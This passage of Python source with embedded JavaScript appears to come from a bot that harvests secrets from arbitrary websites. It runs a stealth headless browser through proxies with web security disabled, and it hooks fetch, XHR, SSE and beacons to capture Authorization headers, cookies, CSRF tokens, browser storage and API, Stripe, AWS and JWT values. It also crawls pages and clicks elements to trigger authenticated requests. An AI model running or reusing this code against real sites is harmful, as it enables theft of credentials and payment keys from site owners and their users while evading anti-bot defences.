                          content_type: ct, body: t.slice(0,2000), ts: Date.now()});
                }).catch(()=>{});
            }
        } catch(e) {}
        return resp;
    };

    // ── 2. XMLHttpRequest hook ─────────────────────────────────────
    const _origXHR = window.XMLHttpRequest;
    function PatchedXHR() {
        const xhr = new _origXHR();
        const meta = {url:'', method:'GET', headers:{}};
        const _origOpen = xhr.open.bind(xhr);
        const _origSend = xhr.send.bind(xhr);
        const _origSetHdr = xhr.setRequestHeader.bind(xhr);
        xhr.open = function(m, u, ...rest) {
            meta.method = m; meta.url = u;
            return _origOpen(m, u, ...rest);
        };
        xhr.setRequestHeader = function(k, v) {
            meta.headers[k.toLowerCase()] = v;
            return _origSetHdr(k, v);
        };
        xhr.send = function(body) {
            _log({type:'xhr', url: meta.url, method: meta.method,
                  headers: meta.headers,
                  body: (typeof body === 'string' ? body.slice(0,500) : ''),
                  ts: Date.now()});
            xhr.addEventListener('load', function() {
                const ct = xhr.getResponseHeader('content-type') || '';
                if (ct.includes('json') || ct.includes('text')) {
                    _log({type:'xhr_response', url: meta.url, status: xhr.status,
                          content_type: ct, body: xhr.responseText.slice(0,2000),
                          ts: Date.now()});
                }
            });
            return _origSend(body);
        };
        return xhr;
    }
    PatchedXHR.prototype = _origXHR.prototype;
    window.XMLHttpRequest = PatchedXHR;

    // ── 3. EventSource (SSE) hook ──────────────────────────────────
    const _origES = window.EventSource;
    if (_origES) {
        window.EventSource = function(url, opts) {
            const es = new _origES(url, opts);
            _log({type:'sse_open', url, ts: Date.now()});
            es.addEventListener('message', function(e) {
                _log({type:'sse_message', url, data: String(e.data).slice(0,1000),
                      ts: Date.now()});
            });
            es.onerror = function() {
                _log({type:'sse_error', url, ts: Date.now()});
            };
            return es;
        };
        window.EventSource.prototype = _origES.prototype;
    }

    // ── 4. navigator.sendBeacon hook ──────────────────────────────
    const _origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
        _log({type:'beacon', url,
              body: (data ? String(data).slice(0,300) : ''),
              ts: Date.now()});
        return _origBeacon(url, data);
    };

    return {status: 'hooks_installed'};
}
"""

# Patterns to extract sensitive values FROM live request headers/bodies
_LIVE_HEADER_PATTERNS = [
    ("Authorization Bearer",  re.compile(r'(?i)^bearer\s+(.+)$')),
    ("Authorization Basic",   re.compile(r'(?i)^basic\s+([A-Za-z0-9+/=]+)$')),
    ("X-Api-Key header",      re.compile(r'.+')),          # full value if header name is x-api-key
    ("X-Auth-Token header",   re.compile(r'.+')),
    ("Stripe-Key header",     re.compile(r'.+')),
]

_LIVE_BODY_PATTERNS = [
    ("Live API key",      re.compile(r'(?i)(?:api[_\-]?key|apikey|access_token|client_secret)\s*[=:&]\s*([A-Za-z0-9_\-]{16,120})')),
    ("Live Bearer token", re.compile(r'(?i)bearer[= ]+([A-Za-z0-9_\-\.]{20,500})')),
    ("Live JWT",          re.compile(r'(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)')),
    ("Live AWS key",      re.compile(r'\b(AKIA[0-9A-Z]{16})\b')),
    ("Live Stripe key",   re.compile(r'\b((?:pk|sk|rk)_(?:live|test)_[A-Za-z0-9]{24,})\b')),
    ("Live OpenAI key",   re.compile(r'\b(sk-[A-Za-z0-9]{20,60})\b')),
]

# Sensitive header names — any value is HIGH confidence
_SENSITIVE_HEADERS = {
    "authorization", "x-api-key", "x-auth-token", "x-access-token",
    "x-secret-key", "api-key", "auth-token", "x-stripe-key",
    "x-firebase-token", "x-rapidapi-key", "stripe-signature",
}


def _stream_intercept_sync(url: str, progress_cb=None) -> dict:
    """
    Inject fetch/XHR/SSE hooks into a live Playwright session.
    Captures real-time network credentials — HIGH confidence findings only.

    Returns:
        {
          "live_requests":  [...],   # all intercepted fetch/XHR entries
          "live_findings":  [...],   # extracted secrets from live traffic
          "sse_frames":     [...],   # SSE stream messages
          "page_url":       str,
          "error":          str|None,
        }
    """
    if not PLAYWRIGHT_OK:
        return {"error": "playwright_not_installed", "live_requests": [],
                "live_findings": [], "sse_frames": [], "page_url": url}

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "playwright_not_installed", "live_requests": [],
                "live_findings": [], "sse_frames": [], "page_url": url}

    live_requests = []
    sse_frames    = []
    page_url_ref  = [url]

    if progress_cb:
        progress_cb("🔴 Launching real-time stream interceptor...")

    try:
        with sync_playwright() as pw:
            _px = proxy_manager.get_proxy()
            _pw_proxy = None
            if _px:
                from urllib.parse import urlparse as _up
                _pp = _up(_px.get("http") or _px.get("https", ""))
                _pw_proxy = {"server": f"{_pp.scheme}://{_pp.hostname}:{_pp.port}"}
                if _pp.username:
                    _pw_proxy["username"] = _pp.username
                    _pw_proxy["password"] = _pp.password or ""

            browser = pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox", "--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                    "--disable-gpu",
                ]
            )
            ctx = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1440, "height": 900},
                ignore_https_errors=True,
                proxy=_pw_proxy,
                java_script_enabled=True,
            )
            # Stealth init
            ctx.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins',   {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                window.chrome = {runtime: {}};
            """)

            page = ctx.new_page()

            # ── Playwright-level response header capture (double-coverage) ──
            _plw_request_headers = {}
            def _on_request_headers(req):
                try:
                    hdrs = {k.lower(): v for k, v in req.all_headers().items()}
                    _plw_request_headers[req.url] = hdrs
                except Exception:
                    pass
            page.on("request", _on_request_headers)

            # ── Load page ──────────────────────────────────────────────────
            try:
                page.goto(url, wait_until="load", timeout=30_000)
                page_url_ref[0] = page.url
            except PWTimeout:
                page_url_ref[0] = page.url
            except Exception as e:
                browser.close()
                return {"error": str(e), "live_requests": [], "live_findings": [],
                        "sse_frames": [], "page_url": url}

            # ── Inject JS hooks ────────────────────────────────────────────
            try:
                page.evaluate(_STREAM_INTERCEPT_JS)
            except Exception as e:
                if progress_cb:
                    progress_cb(f"⚠️ JS hook inject failed: {e}")

            if progress_cb:
                progress_cb("🔴 Hooks injected — simulating user interactions...")

            # ── Trigger real network activity ──────────────────────────────
            try:
                page.wait_for_load_state("networkidle", timeout=10_000)
            except Exception:
                pass

            # Scroll to trigger lazy-load API calls
            for pct in [0.25, 0.5, 0.75, 1.0]:
                try:
                    page.evaluate(f"window.scrollTo(0, document.body.scrollHeight * {pct})")
                    page.wait_for_timeout(500)
                except Exception:
                    pass

            # Click interactive elements to trigger auth'd API calls
            _trigger_selectors = [
                "button:not([disabled])", "[role='button']",
                "a[href='#']", "[data-toggle]", "[data-action]",
                "input[type='submit']", "form button",
            ]
            _clicks = 0
            for sel in _trigger_selectors:
                if _clicks >= 5:
                    break
                try:
                    els = page.query_selector_all(sel)
                    for el in els[:2]:
                        if el.is_visible():
                            el.click(timeout=1000)
                            page.wait_for_timeout(400)
                            _clicks += 1
                except Exception:
                    pass

            # Wait for async API calls to settle
            try:
                page.wait_for_load_state("networkidle", timeout=8_000)
            except Exception:
                pass
            page.wait_for_timeout(2000)

            # ── Read JS hook log ───────────────────────────────────────────
            try:
                raw_log = page.evaluate("() => window.__streamLog || []")
            except Exception:
                raw_log = []

            browser.close()

        # ── Merge Playwright-level header data with JS hook log ────────────
        # Add real request headers captured at Playwright level
        for entry in raw_log:
            u = entry.get("url", "")
            if u in _plw_request_headers:
                plw_hdrs = _plw_request_headers[u]
                hook_hdrs = entry.get("headers", {})
                merged = {**plw_hdrs, **hook_hdrs}
                entry["headers"] = merged

        # ── Separate SSE frames ────────────────────────────────────────────
        for entry in raw_log:
            t = entry.get("type", "")
            if t in ("sse_message", "sse_open"):
                sse_frames.append(entry)
            elif t in ("fetch", "xhr", "beacon", "fetch_response", "xhr_response"):
                live_requests.append(entry)

        if progress_cb:
            progress_cb(
                f"🔴 Captured: `{len(live_requests)}` live requests | "
                f"`{len(sse_frames)}` SSE frames"
            )

        # ── Extract secrets from live traffic ──────────────────────────────
        live_findings = []
        seen_findings = set()

        def _add_live(key_type, value, source, confidence="HIGH"):
            dedup = key_type + ":" + value[:60]
            if dedup in seen_findings or len(value) < 8:
                return
            seen_findings.add(dedup)
            live_findings.append({
                "type":       key_type,
                "value":      value[:300],
                "source":     source,
                "confidence": confidence,
            })

        # 1. Sensitive headers → always HIGH confidence
        for req in live_requests:
            hdrs = req.get("headers", {})
            u    = req.get("url", "")[:80]
            for hdr_name, hdr_val in hdrs.items():
                hn = hdr_name.lower()
                if hn == "authorization":
                    for label, pat in [
                        ("Authorization Bearer", re.compile(r'(?i)^bearer\s+(.+)$')),
                        ("Authorization Basic",  re.compile(r'(?i)^basic\s+([A-Za-z0-9+/=]+)$')),
                    ]:
                        m = pat.match(hdr_val)
                        if m:
                            _add_live(label, m.group(1).strip(), f"Header → {u}")
                        else:
                            _add_live("Authorization header", hdr_val.strip()[:200],
                                      f"Header → {u}")
                    break
                elif hn in _SENSITIVE_HEADERS:
                    _add_live(f"{hdr_name} header (live)", hdr_val.strip()[:200],
                              f"Header → {u}")

        # 2. Request bodies + response bodies
        for req in live_requests:
            for field in ("body", "post_data"):
                text = req.get(field, "")
                if not text:
                    continue
                src = f"{req.get('type','req').upper()} body → {req.get('url','')[:60]}"
                for label, pat in _LIVE_BODY_PATTERNS:
                    for m in pat.finditer(text):
                        val = m.group(1) if m.lastindex else m.group(0)
                        _add_live(label, val.strip(), src)

        # 3. SSE stream data
        for frame in sse_frames:
            data = frame.get("data", "")
            src  = f"SSE → {frame.get('url','')[:60]}"
            for label, pat in _LIVE_BODY_PATTERNS:
                for m in pat.finditer(data):
                    val = m.group(1) if m.lastindex else m.group(0)
                    _add_live(label, val.strip(), src, confidence="MEDIUM")

        if progress_cb:
            progress_cb(f"🔴 Live findings: `{len(live_findings)}` secrets extracted from stream")

        return {
            "error":         None,
            "live_requests": live_requests,
            "live_findings": live_findings,
            "sse_frames":    sse_frames,
            "page_url":      page_url_ref[0],
        }

    except Exception as e:
        return {
            "error":         str(e),
            "live_requests": [],
            "live_findings": [],
            "sse_frames":    [],
            "page_url":      url,
        }


def _confidence_crossref(static_findings: list, live_result: dict) -> list:
    """
    Cross-reference static scan findings against live network traffic.
    Upgrades matching findings to CONFIRMED, downgrades unmatched to LOW.

    Args:
        static_findings: list of {type, value, source, ...} from static scan
        live_result:     return value of _stream_intercept_sync()

    Returns:
        list of findings with added 'confidence' field:
            CONFIRMED  — value seen in both static + live traffic
            HIGH       — found only in live request headers
            MEDIUM     — found in live body/SSE
            STATIC     — found only in static scan (may be false positive)
    """
    live_values = set()

    # Collect all values seen in live traffic
    for req in live_result.get("live_requests", []):
        for field in ("body", "post_data"):
            text = req.get(field, "")
            if text:
                # Extract any 16+ char tokens
                for tok in re.findall(r'[A-Za-z0-9_\-\.]{16,}', text):
                    live_values.add(tok)
        for hdr_val in req.get("headers", {}).values():
            for tok in re.findall(r'[A-Za-z0-9_\-\.]{16,}', str(hdr_val)):
                live_values.add(tok)

    for frame in live_result.get("sse_frames", []):
        for tok in re.findall(r'[A-Za-z0-9_\-\.]{16,}', frame.get("data", "")):
            live_values.add(tok)

    upgraded = []
    for f in static_findings:
        val = f.get("value", "")
        # Check if any 16+ char sub-token of this value appears in live traffic
        val_tokens = set(re.findall(r'[A-Za-z0-9_\-\.]{16,}', val))
        if val_tokens & live_values:
            upgraded.append({**f, "confidence": "CONFIRMED ✅"})
        else:
            upgraded.append({**f, "confidence": "STATIC ⚠️"})

    # Also include pure live findings not in static
    static_values = {f.get("value", "")[:60] for f in static_findings}
    for lf in live_result.get("live_findings", []):
        if lf.get("value", "")[:60] not in static_values:
            upgraded.append({**lf, "confidence": lf.get("confidence", "HIGH")})

    return upgraded


def _gather_all_text_v2(data: dict, live_result: dict | None = None) -> list:
    """
    Extended version of _gather_all_text — adds live stream bodies.
    Drop-in replacement: if live_result is None, behaves identically.
    """
    texts = _gather_all_text(data)  # existing: html + JS network_log + console

    if not live_result:
        return texts

    # Add live request/response bodies
    for req in live_result.get("live_requests", []):
        u = req.get("url", "")[:70]
        for field, label in [("body", "Live POST"), ("post_data", "Live XHR body")]:
            text = req.get(field, "")
            if text and len(text) > 10:
                texts.append((text, f"{label} → {u}"))

    # Add SSE stream messages
    sse_combined = "\n".join(
        f.get("data", "") for f in live_result.get("sse_frames", []) if f.get("data")
    )
    if sse_combined:
        texts.append((sse_combined, "SSE stream frames"))

    return texts


# ══════════════════════════════════════════════════════════════════════
# 🌐  SHARED DYNAMIC HELPERS  (Option A + Option B)
#     Used by: /apikeys /hiddenkeys /paykeys /firebase
#              /socialkeys /analytics /pushkeys /sitekey
# ══════════════════════════════════════════════════════════════════════

# ── Option B — Deep Asset Fetcher ────────────────────────────────────
def _deep_asset_fetch(url: str, existing_network_log: list,
                      progress_cb=None) -> list:
    """
    Option B: Find & fetch JS assets that weren't captured during initial load.
    Scans HTML for <script src>, checks .js.map source maps,
    and fetches each new URL with requests.
    Returns list of {url, response_body} dicts to merge into scan.
    """
    from urllib.parse import urljoin as _uj, urlparse as _up
    already = {e.get("url", "") for e in existing_network_log}
    new_entries = []
    seen_fetch  = set(already)

    # ── Step 1: Fetch page HTML to find <script src> tags ───────────
    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        html = resp.text
    except Exception:
        return []

    soup = BeautifulSoup(html, "html.parser")
    candidates = []

    # <script src="..."> tags
    for tag in soup.find_all("script", src=True):
        src = tag["src"].strip()
        if not src or src.startswith("data:"):
            continue
        full = _uj(url, src)
        # same-origin + JS only
        parsed = _up(full)
        if parsed.scheme not in ("http", "https"):
            continue
        if full not in seen_fetch:
            candidates.append(full)
            seen_fetch.add(full)

    # ── Step 2: Also check .js.map for each known JS URL ────────────
    for entry in existing_network_log:
        js_url = entry.get("url", "")
        if js_url.endswith(".js"):
            map_url = js_url + ".map"
            if map_url not in seen_fetch:
                candidates.append(map_url)
                seen_fetch.add(map_url)

    if progress_cb:
        progress_cb(f"📦 Deep fetch: {len(candidates)} additional assets found...")

    # ── Step 3: Fetch each candidate ────────────────────────────────
    MAX_DEEP_ASSETS = 30
    MAX_BODY_KB     = 512

    for asset_url in candidates[:MAX_DEEP_ASSETS]:
        # SSRF check
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok:
            continue
        try:
            r = requests.get(asset_url, headers=HEADERS, timeout=12,
                             verify=False, stream=True)
            ct = r.headers.get("content-type", "")
            # Only JS, JSON, text
            if not any(x in ct for x in ("javascript", "json", "text", "wasm")):
                # Allow if URL ends with .js/.json/.map regardless of CT
                if not asset_url.rsplit(".", 1)[-1] in ("js", "json", "map", "ts"):
                    continue
            body = r.raw.read(MAX_BODY_KB * 1024).decode("utf-8", errors="replace")
            if len(body) > 50:
                new_entries.append({"url": asset_url, "response_body": body})
        except Exception:
            continue

    if progress_cb and new_entries:
        progress_cb(f"📦 Deep fetch: {len(new_entries)} assets fetched & ready")

    return new_entries


# ── Option A — Playwright Dynamic Interceptor ─────────────────────────
_DYNAMIC_BASE_HOOKS = """
// ── Anti-bot evasion ─────────────────────────────────────────────────
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
Object.defineProperty(navigator, 'plugins',   {get: () => [1,2,3,4,5]});
window.chrome = {runtime: {}};

// ── XHR interceptor — capture request/response bodies ────────────────
window.__dynLog = {xhr: [], fetch_: [], storage: {}, hooks: {}};
(function() {
    const _origOpen  = XMLHttpRequest.prototype.open;
    const _origSend  = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.__dyn_url    = url;
        this.__dyn_method = method;
        return _origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener('load', function() {
            try {
                const entry = {
                    url:    this.__dyn_url    || '',
                    method: this.__dyn_method || 'GET',
                    status: this.status,
                    body:   (this.responseText || '').substring(0, 4000)
                };
                if (entry.body.length > 10)
                    window.__dynLog.xhr.push(entry);
            } catch(e) {}
        });
        return _origSend.apply(this, arguments);
    };
})();

// ── fetch() interceptor ───────────────────────────────────────────────
(function() {
    const _origFetch = window.fetch;
    window.fetch = async function(input, init) {
        const response = await _origFetch.apply(this, arguments);
        try {
            const clone = response.clone();
            const text  = await clone.text();
            window.__dynLog.fetch_.push({
                url:    (typeof input === 'string' ? input : input.url || '').substring(0, 200),
                status: response.status,
                body:   text.substring(0, 4000)
            });
        } catch(e) {}
        return response;
    };
})();

// ── localStorage + sessionStorage dump ───────────────────────────────
(function() {
    try {
        const ls = {};
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            ls[k] = localStorage.getItem(k) || '';
        }
        window.__dynLog.storage.localStorage = ls;
    } catch(e) {}
    try {
        const ss = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const k = sessionStorage.key(i);
            ss[k] = sessionStorage.getItem(k) || '';
        }
        window.__dynLog.storage.sessionStorage = ss;
    } catch(e) {}
})();
"""

# Per-category JS hooks injected alongside the base hooks
_DYN_HOOKS = {
    "apikeys": """
(function() {
    // Scan window globals for API key-like values
    const _apiPat = [
        /\\b(AIza[0-9A-Za-z_-]{35})\\b/,
        /\\b(sk-[A-Za-z0-9]{20,60})\\b/,
        /\\b(AKIA[0-9A-Z]{16})\\b/,
        /\\b(gh[pousr]_[A-Za-z0-9]{36,255})\\b/,
        /\\b(SG\\.[A-Za-z0-9_-]{22,60}\\.[A-Za-z0-9_-]{22,60})\\b/,
    ];
    const hits = {};
    for (const k of Object.keys(window)) {
        try {
            const v = String(window[k] || '');
            if (v.length < 10 || v.length > 300) continue;
            for (const p of _apiPat) {
                const m = p.exec(v);
                if (m) { hits['global_' + k] = m[1]; break; }
            }
        } catch(e) {}
    }
    window.__dynLog.hooks.apikeys_globals = hits;
})();
""",
    "firebase": """
(function() {
    const fb = {};
    // Hook firebase.initializeApp before it's called
    const _poll = setInterval(function() {
        if ((window.firebase || window.initializeApp) && !window.__fbHooked) {
            window.__fbHooked = true;
            // Capture existing app configs
            if (window.firebase && window.firebase.apps) {
                fb.apps = window.firebase.apps.map(a => {
                    try { return a.options; } catch(e) { return {}; }
                });
            }
            // Hook new calls
            const _orig = window.firebase && window.firebase.initializeApp
                        ? window.firebase.initializeApp.bind(window.firebase)
                        : null;
            if (_orig) {
                window.firebase.initializeApp = function(config, name) {
                    try { fb['init_' + (name||'default')] = config; } catch(e) {}
                    return _orig(config, name);
                };
            }
            clearInterval(_poll);
        }
    }, 200);
    setTimeout(() => clearInterval(_poll), 15000);
    window.__dynLog.hooks.firebase = fb;
})();
""",
    "socialkeys": """
(function() {
    const social = {};
    // Facebook SDK hook
    window.fbAsyncInit_orig = window.fbAsyncInit;
    window.fbAsyncInit = function() {
        if (window.fbAsyncInit_orig) window.fbAsyncInit_orig();
        const _origInit = window.FB && window.FB.init ? window.FB.init.bind(window.FB) : null;
        if (_origInit) {
            window.FB.init = function(opts) {
                try { social.fb_init = opts; } catch(e) {}
                return _origInit(opts);
            };
        }
    };
    // Google gapi hook
    const _gPoll = setInterval(function() {
        if (window.gapi && window.gapi.load && !window.__gapiHooked) {
            window.__gapiHooked = true;
            const _origLoad = window.gapi.load.bind(window.gapi);
            window.gapi.load = function(libs, opts) {
                try { social['gapi_load_' + libs] = JSON.stringify(opts||{}).substring(0,200); } catch(e) {}
                return _origLoad(libs, opts);
            };
            clearInterval(_gPoll);
        }
    }, 300);
    setTimeout(() => clearInterval(_gPoll), 15000);
    window.__dynLog.hooks.social = social;
})();
""",
    "analytics": """
(function() {
    const ana = {};
    // gtag hook
    if (typeof window.gtag !== 'function') {
        window.gtag = function() {
            try {
                const args = Array.from(arguments);
                if (args[0] === 'config') ana['gtag_config_' + args[1]] = JSON.stringify(args[2]||{}).substring(0,200);
            } catch(e) {}
        };
    } else {
        const _origGtag = window.gtag;
        window.gtag = function() {
            const args = Array.from(arguments);
            try {
                if (args[0] === 'config') ana['gtag_config_' + args[1]] = JSON.stringify(args[2]||{}).substring(0,200);
            } catch(e) {}
            return _origGtag.apply(this, args);
        };
    }
    // Facebook Pixel hook
    const _origFbq = window.fbq;
    if (_origFbq) {
        window.fbq = function() {
            const args = Array.from(arguments);
            try {
                if (args[0] === 'init') ana['fbq_pixel_id'] = String(args[1]);
            } catch(e) {}
            return _origFbq.apply(this, args);
        };
    }
    // Mixpanel hook
    const _mpPoll = setInterval(function() {
        if (window.mixpanel && window.mixpanel.init && !window.__mpHooked) {
            window.__mpHooked = true;
            const _orig = window.mixpanel.init.bind(window.mixpanel);
            window.mixpanel.init = function(token, cfg) {
                try { ana['mixpanel_token'] = token; } catch(e) {}
                return _orig(token, cfg);
            };
            clearInterval(_mpPoll);
        }
    }, 300);
    setTimeout(() => clearInterval(_mpPoll), 15000);
    window.__dynLog.hooks.analytics = ana;
})();
""",
    "pushkeys": """
(function() {
    const push = {};
    // Hook PushManager.subscribe to capture VAPID key
    const _swPoll = setInterval(function() {
        if (navigator.serviceWorker && !window.__swHooked) {
            window.__swHooked = true;
            const _origReg = navigator.serviceWorker.register.bind(navigator.serviceWorker);
            navigator.serviceWorker.register = function(scriptUrl, opts) {
                try { push['sw_script'] = scriptUrl; } catch(e) {}
                const reg = _origReg(scriptUrl, opts);
                reg.then && reg.then(function(r) {
                    const _origSub = r.pushManager && r.pushManager.subscribe
                                   ? r.pushManager.subscribe.bind(r.pushManager) : null;
                    if (_origSub) {
                        r.pushManager.subscribe = function(options) {
                            try { push['vapid_key'] = options && options.applicationServerKey
                                    ? btoa(String.fromCharCode(...new Uint8Array(options.applicationServerKey)))
                                    : ''; } catch(e) {}
                            return _origSub(options);
                        };
                    }
                }).catch(()=>{});
                return reg;
            };
            clearInterval(_swPoll);
        }
    }, 300);
    setTimeout(() => clearInterval(_swPoll), 15000);
    window.__dynLog.hooks.push = push;
})();
""",
    "hiddenkeys": """
(function() {
    const hidden = {};
    // Capture CSRF tokens from fetch/XHR request headers
    const _origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        try {
            if (/x-csrf|x-xsrf|x-requested-with|authorization/i.test(name)) {
                hidden['header_' + name] = value;
            }
        } catch(e) {}
        return _origSetHeader.apply(this, arguments);
    };
    // Deep cookie dump including HttpOnly flags visible to JS
    try {
        hidden['all_cookies'] = document.cookie;
    } catch(e) {}
    // meta[name=csrf-token] and input[name*=token]
    try {
        const meta = document.querySelector('meta[name*="csrf"],meta[name*="token"],meta[name*="nonce"]');
        if (meta) hidden['meta_token'] = meta.content || meta.getAttribute('content') || '';
    } catch(e) {}
    window.__dynLog.hooks.hidden = hidden;
})();
""",
    "sitekey": """
(function() {
    const sk = {};
    // grecaptcha v2/v3 hook
    const _rePoll = setInterval(function() {
        if (window.grecaptcha && !window.__reHooked) {
            window.__reHooked = true;
            const _render = window.grecaptcha.render;
            if (_render) {
                window.grecaptcha.render = function(container, params) {
                    try { if (params && params.sitekey) sk['recaptcha_v2'] = params.sitekey; } catch(e) {}
                    return _render.call(window.grecaptcha, container, params);
                };
            }
            const _execute = window.grecaptcha.execute;
            if (_execute) {
                window.grecaptcha.execute = function(sitekey, action) {
                    try { sk['recaptcha_v3'] = sitekey; } catch(e) {}
                    return _execute.call(window.grecaptcha, sitekey, action);
                };
            }
            clearInterval(_rePoll);
        }
    }, 200);
    // hCaptcha hook
    const _hcPoll = setInterval(function() {
        if (window.hcaptcha && !window.__hcHooked) {
            window.__hcHooked = true;
            const _hRender = window.hcaptcha.render;
            if (_hRender) {
                window.hcaptcha.render = function(container, params) {
                    try { if (params && params.sitekey) sk['hcaptcha'] = params.sitekey; } catch(e) {}
                    return _hRender.call(window.hcaptcha, container, params);
                };
            }
            clearInterval(_hcPoll);
        }
    }, 200);
    // Cloudflare Turnstile hook
    const _cfPoll = setInterval(function() {
        if (window.turnstile && !window.__cfHooked) {
            window.__cfHooked = true;
            const _cfRender = window.turnstile.render;
            if (_cfRender) {
                window.turnstile.render = function(container, params) {
                    try { if (params && params.sitekey) sk['turnstile'] = params.sitekey; } catch(e) {}
                    return _cfRender.call(window.turnstile, container, params);
                };
            }
            clearInterval(_cfPoll);
        }
    }, 200);
    setTimeout(() => { clearInterval(_rePoll); clearInterval(_hcPoll); clearInterval(_cfPoll); }, 15000);
    window.__dynLog.hooks.sitekey = sk;
})();
""",
}


def _playwright_dynamic_scan(url: str, category: str,
                              progress_cb=None) -> dict:
    """
    Option A: Playwright-based dynamic interceptor.
    Injects XHR/fetch hooks + localStorage dump + category-specific
    constructor hooks before page scripts run.
    Returns {xhr, fetch_, storage, hooks} — caller merges into findings.
    """
    empty = {"xhr": [], "fetch_": [], "storage": {}, "hooks": {}}
    if not PLAYWRIGHT_OK:
        return empty

    extra_hooks = _DYN_HOOKS.get(category, "")
    init_script  = _DYNAMIC_BASE_HOOKS + "\n" + extra_hooks

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return empty

    if progress_cb:
        progress_cb(f"🌐 Dynamic intercept ({category}) launching...")

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-setuid-sandbox",
                "--disable-blink-features=AutomationControlled",
            ])
            ctx  = browser.new_context(
                user_agent=HEADERS["User-Agent"],
                ignore_https_errors=True,
            )
            ctx.add_init_script(init_script)
            page = ctx.new_page()

            try:
                page.goto(url, wait_until="networkidle", timeout=25000)
            except PWTimeout:
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
                except Exception:
                    pass

            # Trigger lazy-loaded SDKs
            try:
                page.mouse.move(300, 300)
                page.mouse.wheel(0, 400)
                page.wait_for_timeout(3000)
            except Exception:
                pass

            # Retrieve captured data from window.__dynLog
            try:
                dyn = page.evaluate("() => JSON.parse(JSON.stringify(window.__dynLog || {}))")
            except Exception:
                dyn = {}

            ctx.close()
            browser.close()

        return {
            "xhr":     dyn.get("xhr",    []),
            "fetch_":  dyn.get("fetch_", []),
            "storage": dyn.get("storage", {}),
            "hooks":   dyn.get("hooks",  {}),
        }

    except Exception as e:
        logger.debug("_playwright_dynamic_scan error (%s): %s", category, e)
        return empty


def _merge_dynamic_into_data(data: dict, dyn: dict,
                              new_assets: list) -> dict:
    """
    Merge Option A (dyn) and Option B (new_assets) results into
    the existing data dict so _gather_all_text picks them up automatically.
    """
    # Option B: append new asset bodies to network_log
    existing_log = data.get("network_log", [])
    for asset in new_assets:
        existing_log.append({
            "url":           asset["url"],
            "method":        "GET",
            "post_data":     "",
            "response_body": asset["response_body"],
        })
    data["network_log"] = existing_log

    # Option A: append XHR/fetch response bodies
    for entry in dyn.get("xhr", []):
        body = entry.get("body", "")
        if body and len(body) > 20:
            existing_log.append({
                "url":           entry.get("url", "XHR"),
                "method":        entry.get("method", "GET"),
                "post_data":     "",
                "response_body": body,
            })

    for entry in dyn.get("fetch_", []):
        body = entry.get("body", "")
        if body and len(body) > 20:
            existing_log.append({
                "url":           entry.get("url", "fetch"),
                "method":        "GET",
                "post_data":     "",
                "response_body": body,
            })

    # Option A: localStorage/sessionStorage into dom_result
    storage = dyn.get("storage", {})
    dr = data.get("dom_result") or {}
    if "localStorage" not in dr and storage.get("localStorage"):
        dr["localStorage"] = storage["localStorage"]
    if "sessionStorage" not in dr and storage.get("sessionStorage"):
        dr["sessionStorage"] = storage["sessionStorage"]
    data["dom_result"] = dr

    return data


def _multipage_crawl(base_url: str, js_eval_code: str,
                     max_pages: int = 5, progress_cb=None) -> list:
    """
    Phase 3 Fix 2: Multi-page same-origin crawl.
    Follows href links on the seed page (same origin only),
    runs _run_playwright_extract on each, merges network_log + html.
    Returns list of extract dicts (one per page crawled).
    """
    from urllib.parse import urlparse as _up_mc, urljoin as _uj
    _base = _up_mc(base_url)
    _origin = f"{_base.scheme}://{_base.netloc}"
    visited  = set()
    queue    = [base_url]
    results  = []

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        # Normalise — strip fragment
        clean = url.split("#")[0].rstrip("/") or url
        if clean in visited:
            continue
        visited.add(clean)

        if progress_cb:
            progress_cb(f"🕷️ Crawling page {len(visited)}/{max_pages}: `{_up_mc(url).path or '/'}`")

        data = _run_playwright_extract(url, js_eval_code, progress_cb=None)
        if data.get("error"):
            continue
        results.append(data)

        # Discover same-origin links from HTML
        if len(visited) < max_pages:
            from bs4 import BeautifulSoup as _BS
            try:
                soup = _BS(data.get("html",""), "html.parser")
                for a in soup.find_all("a", href=True):
                    href = a["href"].strip()
                    # Skip anchors, mailto, js:, external
                    if not href or href.startswith(("#","mailto:","javascript:","tel:")):
                        continue
                    full = _uj(url, href).split("#")[0].rstrip("/")
                    # Same origin only
                    if not full.startswith(_origin):
                        continue
                    # Skip binary/media extensions
                    _ext = full.rsplit(".",1)[-1].lower() if "." in full.rsplit("/",1)[-1] else ""
                    if _ext in ("pdf","png","jpg","jpeg","gif","svg","ico","zip","woff","woff2","ttf"):
                        continue
                    if full not in visited and full not in queue:
                        queue.append(full)
            except Exception:
                pass

    return results


def _merge_crawl_results(results: list) -> dict:
    """Merge multiple page extract dicts into one unified dict for scanning."""
    if not results:
        return {"error": "no pages crawled", "html": "", "network_log": [],
                "console_log": [], "dom_result": None, "page_url": ""}
    merged = {
        "error":       None,
        "html":        results[0].get("html",""),
        "network_log": [],
        "console_log": [],
